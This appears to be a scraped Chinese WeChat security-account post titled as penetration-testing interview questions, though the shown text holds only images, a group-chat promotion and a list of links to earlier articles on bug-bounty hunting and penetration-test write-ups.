渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=other&from=appmsg "")  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth4XVg1lOlNxwQiahj7T2sz5mMMpwjhO80ylGkWqmmKtcrp2iaH2BSibLcw/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[手把手js逆向断点调试&js逆向前端加密对抗&企业SRC实战分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247495361&idx=1&sn=48283073b325e360823da8dec27a7508&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[浅谈src漏洞挖掘中容易出洞的几种姿势](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247489731&idx=1&sn=c3a5ef01648fad496ecda36b653b6e21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[HVV护网行动 | 分享最近攻防演练HVV漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247488672&idx=1&sn=493bb70011a02eb971ff1b74c733f1d9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[攻防演练｜分享最近一次攻防演练RTSP奇特之旅](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492377&idx=1&sn=a94ad30e30e08bd96e888dad744e9814&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[JS漏洞挖掘｜分享使用FindSomething联动的挖掘思路](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492315&idx=1&sn=88991e98058a277e267a9a79b8518e16&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493292&idx=1&sn=611fd43361089a30e5f7bcda21274b95&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[分享SRC中后台登录处站点的漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247485439&idx=1&sn=3fd7e4cef57edca8e73104f8af38fc05&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[企业SRC支付漏洞&EDUSRC&众测挖掘思路技巧操作分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492839&idx=1&sn=b9781f60580c1da8e2151166f0494ba5&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 分享某次项目上的渗透测试漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493495&idx=1&sn=791bebc6faa651cc3c585c2f5f481d21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】分享云安全浪潮src漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494877&idx=1&sn=2d00c0f651fd7375e881be86638e53ce&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[实战SRC挖掘｜微信小程序渗透漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494468&idx=1&sn=f0da4b4ff7763cbb83b858fb5a8964f9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[综合资产测绘 | 手把手带你搞定信息收集](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493749&idx=1&sn=d2e0febcdcf9dcd8aa44be0d43b51936&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】针对若依系统nday的常见各种姿势利用](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac&scene=21#wechat_redirect)  
  
  
  
